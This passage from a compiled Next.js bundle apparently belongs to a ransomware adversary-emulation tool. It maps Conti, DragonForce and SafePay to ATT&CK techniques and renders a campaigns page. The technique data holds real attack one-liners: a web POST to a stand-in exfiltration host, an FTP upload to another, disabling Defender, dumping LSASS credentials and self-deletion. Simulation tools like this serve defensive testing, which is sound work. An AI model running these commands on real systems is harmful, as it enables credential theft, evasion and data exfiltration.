        ],
        description: 'Major RaaS operation until 2022. Known for fast encryption and double extortion.',
        ttps: [
            {
                id: 'T1486',
                technique: 'Data Encrypted for Impact',
                tactic: 'Impact',
                description: 'Fast, multi-threaded file encryption.',
                commandSnippet: '# Fast encryption simulation',
                scriptPath: 'scenarios/conti/encrypt_sim.ps1'
            },
            {
                id: 'T1567',
                technique: 'Exfiltration Over Web Service',
                tactic: 'Exfiltration',
                description: 'Exfiltrates data before encryption for double extortion.',
                commandSnippet: 'Invoke-WebRequest -Uri "https://c2.exfil.io/upload" -Method POST',
                scriptPath: 'scenarios/conti/exfil_web.ps1',
                inputParams: [
                    {
                        name: 'ExfilURL',
                        label: 'Exfiltration URL',
                        type: 'url',
                        placeholder: 'http://10.0.0.1:8080/upload',
                        required: true
                    }
                ]
            }
        ]
    },
    {
        id: 'dragonforce',
        name: 'DragonForce',
        aliases: [
            'DragonForce Malaysia'
        ],
        description: 'Hacktivist-turned-ransomware group known for self-deleting payloads.',
        ttps: [
            {
                id: 'T1562.001',
                technique: 'Impair Defenses: Disable or Modify Tools',
                tactic: 'Defense Evasion',
                description: 'Disables Windows Defender before encryption.',
                commandSnippet: 'Set-MpPreference -DisableRealtimeMonitoring $true',
                scriptPath: 'scenarios/dragonforce/disable_defender.ps1',
                revertScriptPath: 'scenarios/dragonforce/disable_defender_revert.ps1'
            },
            {
                id: 'T1070.004',
                technique: 'Indicator Removal: File Deletion',
                tactic: 'Defense Evasion',
                description: 'Self-deletes ransomware binary after execution.',
                commandSnippet: 'Remove-Item -Path $MyInvocation.MyCommand.Path -Force',
                scriptPath: 'scenarios/dragonforce/self_delete.ps1'
            },
            {
                id: 'T1486',
                technique: 'Data Encrypted for Impact',
                tactic: 'Impact',
                description: 'Encrypts files for ransom.',
                commandSnippet: '# Encryption simulation',
                scriptPath: 'scenarios/dragonforce/encrypt_sim.ps1'
            }
        ]
    },
    {
        id: 'safepay',
        name: 'SafePay',
        aliases: [
            'SafePay Ransomware'
        ],
        description: 'RaaS gaining access via RDP and using UAC bypass via CMSTPLUA COM object.',
        ttps: [
            {
                id: 'T1133',
                technique: 'External Remote Services',
                tactic: 'Initial Access',
                description: 'Gains access via exposed RDP services.',
                commandSnippet: 'Test-NetConnection -ComputerName <TARGET> -Port 3389',
                scriptPath: 'scenarios/safepay/rdp_scan.ps1',
                inputParams: [
                    {
                        name: 'TargetIP',
                        label: 'Target IP or Subnet',
                        type: 'subnet',
                        placeholder: '10.0.0.0/24',
                        required: true
                    }
                ]
            },
            {
                id: 'T1548.002',
                technique: 'Abuse Elevation Control Mechanism: Bypass UAC',
                tactic: 'Privilege Escalation',
                description: 'Bypasses UAC using CMSTPLUA COM object.',
                commandSnippet: '# UAC bypass via CMSTPLUA simulation',
                scriptPath: 'scenarios/safepay/uac_bypass.ps1',
                revertScriptPath: 'scenarios/safepay/uac_bypass_revert.ps1'
            },
            {
                id: 'T1003',
                technique: 'Credential Dumping',
                tactic: 'Credential Access',
                description: 'Harvests credentials for lateral movement.',
                commandSnippet: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump (Get-Process lsass).Id C:\\temp\\lsass.dmp full',
                scriptPath: 'scenarios/safepay/cred_dump.ps1'
            },
            {
                id: 'T1048',
                technique: 'Exfiltration Over Alternative Protocol',
                tactic: 'Exfiltration',
                description: 'Uses FTP (FileZilla) for data exfiltration.',
                commandSnippet: 'ftp -s:script.txt ftp.exfil.io',
                scriptPath: 'scenarios/safepay/ftp_exfil.ps1',
                inputParams: [
                    {
                        name: 'FTPServer',
                        label: 'FTP Server IP',
                        type: 'ip',
                        placeholder: '10.0.0.1',
                        required: true
                    }
                ]
            }
        ]
    }
];
}),
"[project]/src/app/page.module.css [app-ssr] (css module)", ((__turbopack_context__) => {

__turbopack_context__.v({
  "badge": "page-module___8aEwW__badge",
  "header": "page-module___8aEwW__header",
  "scenariosGrid": "page-module___8aEwW__scenariosGrid",
  "status": "page-module___8aEwW__status",
  "tag": "page-module___8aEwW__tag",
});
}),
"[project]/src/app/campaigns/page.tsx [app-ssr] (ecmascript)", ((__turbopack_context__) => {
"use strict";

__turbopack_context__.s([
    "default",
    ()=>CampaignsPage
]);
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/server/route-modules/app-page/vendored/ssr/react-jsx-dev-runtime.js [app-ssr] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$client$2f$app$2d$dir$2f$link$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/client/app-dir/link.js [app-ssr] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$types$2e$ts__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/types.ts [app-ssr] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$page$2e$module$2e$css__$5b$app$2d$ssr$5d$__$28$css__module$29$__ = __turbopack_context__.i("[project]/src/app/page.module.css [app-ssr] (css module)"); // Reusing dashboard styles
'use client';
;
;
;
;
function CampaignsPage() {
    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("main", {
        className: "container",
        style: {
            animation: 'fadeIn 0.3s ease'
        },
        children: [
            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("header", {
                style: {
                    marginBottom: '2rem',
                    borderBottom: '1px solid #333',
                    paddingBottom: '1rem'
                },
                children: [
                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("h1", {
                        className: "mono text-primary glow-text",
                        style: {
                            fontSize: '2.5rem',
                            marginBottom: '0.5rem'
                        },
                        children: "ADVERSARY CAMPAIGNS"
                    }, void 0, false, {
                        fileName: "[project]/src/app/campaigns/page.tsx",
                        lineNumber: 11,
                        columnNumber: 17
                    }, this),
                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
                        className: "text-dim mono",
                        children: "End-to-End Attack Simulations // Multi-Stage TTPs"
                    }, void 0, false, {
                        fileName: "[project]/src/app/campaigns/page.tsx",
                        lineNumber: 14,
                        columnNumber: 17
                    }, this)
                ]
            }, void 0, true, {
                fileName: "[project]/src/app/campaigns/page.tsx",
                lineNumber: 10,
                columnNumber: 13
            }, this),
            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$page$2e$module$2e$css__$5b$app$2d$ssr$5d$__$28$css__module$29$__["default"].scenariosGrid,
                children: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$types$2e$ts__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["CAMPAIGNS"].map((campaign)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                        className: "card",
                        style: {
                            border: '1px solid #333'
                        },
                        onMouseEnter: (e)=>e.currentTarget.style.borderColor = 'var(--primary)',
                        onMouseLeave: (e)=>e.currentTarget.style.borderColor = '#333',
                        children: [
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                style: {
                                    display: 'flex',
                                    justifyContent: 'space-between',
                                    alignItems: 'center',
                                    marginBottom: '1rem'
                                },
                                children: [
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                        className: "badge",
                                        style: {
                                            color: 'var(--warning)',
                                            borderColor: 'var(--warning)'
                                        },
                                        children: campaign.adversary
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/campaigns/page.tsx",
                                        lineNumber: 25,
                                        columnNumber: 29
                                    }, this),
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                        className: "mono text-dim",
                                        style: {
                                            fontSize: '0.8rem'
                                        },
                                        children: [
                                            campaign.steps.length,
                                            " STEPS"
                                        ]
                                    }, void 0, true, {
                                        fileName: "[project]/src/app/campaigns/page.tsx",
                                        lineNumber: 26,
                                        columnNumber: 29
                                    }, this)
                                ]
                            }, void 0, true, {
                                fileName: "[project]/src/app/campaigns/page.tsx",
                                lineNumber: 24,
                                columnNumber: 25
                            }, this),
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("h2", {
                                className: "mono text-primary",
                                style: {
                                    fontSize: '1.2rem',
                                    marginBottom: '0.5rem'
                                },
                                children: campaign.name
                            }, void 0, false, {
                                fileName: "[project]/src/app/campaigns/page.tsx",
                                lineNumber: 29,
                                columnNumber: 25
                            }, this),
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
                                className: "text-dim",
                                style: {
                                    fontSize: '0.9rem',
                                    marginBottom: '1.5rem',
                                    lineHeight: '1.5',
                                    minHeight: '3em'
                                },
                                children: [
                                    campaign.description.substring(0, 100),
                                    "..."
                                ]
                            }, void 0, true, {
                                fileName: "[project]/src/app/campaigns/page.tsx",
                                lineNumber: 32,
                                columnNumber: 25
                            }, this),
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                style: {
                                    marginBottom: '1.5rem'
                                },
                                children: [
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
                                        className: "mono text-dim",
                                        style: {
                                            fontSize: '0.75rem',
                                            marginBottom: '0.5rem'
                                        },
                                        children: "ATTACK CHAIN:"
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/campaigns/page.tsx",
                                        lineNumber: 37,
                                        columnNumber: 29
                                    }, this),
                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                        style: {
                                            display: 'grid',
                                            gap: '0.25rem'
                                        },
                                        children: [
                                            campaign.steps.slice(0, 4).map((step, i)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                                    className: "accent-item",
                                                    style: {
                                                        padding: '0.4rem 0.75rem',
                                                        fontSize: '0.8rem'
                                                    },
                                                    children: [
                                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                                            className: "text-primary mono",
                                                            style: {
                                                                marginRight: '0.5rem'
                                                            },
                                                            children: "↓"
                                                        }, void 0, false, {
                                                            fileName: "[project]/src/app/campaigns/page.tsx",
                                                            lineNumber: 41,
                                                            columnNumber: 41
                                                        }, this),
                                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                                            className: "mono text-dim",
                                                            children: step
                                                        }, void 0, false, {
                                                            fileName: "[project]/src/app/campaigns/page.tsx",
                                                            lineNumber: 42,
                                                            columnNumber: 41
                                                        }, this)
                                                    ]
                                                }, i, true, {
                                                    fileName: "[project]/src/app/campaigns/page.tsx",
                                                    lineNumber: 40,
                                                    columnNumber: 37
                                                }, this)),
                                            campaign.steps.length > 4 && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
                                                className: "mono text-dim",
                                                style: {
                                                    fontSize: '0.75rem',
                                                    paddingLeft: '0.75rem'
                                                },
                                                children: [
                                                    "+",
                                                    campaign.steps.length - 4,
                                                    " more steps..."
                                                ]
                                            }, void 0, true, {
                                                fileName: "[project]/src/app/campaigns/page.tsx",
                                                lineNumber: 46,
                                                columnNumber: 37
                                            }, this)
                                        ]
                                    }, void 0, true, {
                                        fileName: "[project]/src/app/campaigns/page.tsx",
                                        lineNumber: 38,
                                        columnNumber: 29
                                    }, this)
                                ]
                            }, void 0, true, {
                                fileName: "[project]/src/app/campaigns/page.tsx",
                                lineNumber: 36,
                                columnNumber: 25
                            }, this),
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$client$2f$app$2d$dir$2f$link$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["default"], {
                                href: `/campaigns/${campaign.id}`,
                                className: "btn",
                                style: {
                                    display: 'block',
                                    textAlign: 'center',
                                    textDecoration: 'none'
                                },
                                children: "INITIATE CAMPAIGN"
                            }, void 0, false, {
                                fileName: "[project]/src/app/campaigns/page.tsx",
                                lineNumber: 53,
                                columnNumber: 25
                            }, this)
                        ]
                    }, campaign.id, true, {
                        fileName: "[project]/src/app/campaigns/page.tsx",
                        lineNumber: 21,
                        columnNumber: 21
                    }, this))
            }, void 0, false, {
                fileName: "[project]/src/app/campaigns/page.tsx",
                lineNumber: 19,
                columnNumber: 13
            }, this)
        ]
    }, void 0, true, {
        fileName: "[project]/src/app/campaigns/page.tsx",
        lineNumber: 9,
        columnNumber: 9
    }, this);
}
}),
];

//# sourceMappingURL=src_ea876c8d._.js.map